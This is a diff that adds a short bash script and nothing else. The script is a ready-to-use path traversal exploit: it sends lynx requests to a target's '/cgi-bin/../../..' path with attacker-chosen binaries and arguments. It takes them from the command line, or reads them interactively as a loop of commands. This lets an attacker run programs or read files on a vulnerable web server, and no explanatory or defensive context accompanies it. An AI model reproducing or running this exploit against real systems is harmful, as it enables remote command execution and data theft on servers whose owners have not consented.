@@ -1,0 +1,38 @@
+#!/bin/bash
+
+( test -z "$1" || test -z "$2" ) && echo "Usage: $0 <host> <port> ..." || (
+    if test -n "$3"; then
+        cmd="lynx --source http://$1:$2/cgi-bin/../../../../../../../../.."
+        shift
+        shift
+        count=0
+        while test -n "$1"; do
+            if test $count -eq 0; then
+                cmd="$cmd$1"
+            elif test $count -eq 1; then
+                cmd="$cmd?$1"
+            else
+                cmd="$cmd&$1"
+            fi
+            count=$((count+1))
+            shift
+        done
+        $cmd
+    else
+        while read x; do
+            cmd="lynx --source http://$1:$2/cgi-bin/../../../../../../../../.."
+            count=0
+            for arg in $x; do
+                if test $count -eq 0; then
+                    cmd="$cmd$arg"
+                elif test $count -eq 1; then
+                    cmd="$cmd?$arg"
+                else
+                    cmd="$cmd&$arg"
+                fi
+                count=$((count+1))
+            done
+            $cmd
+        done
+    fi
+)
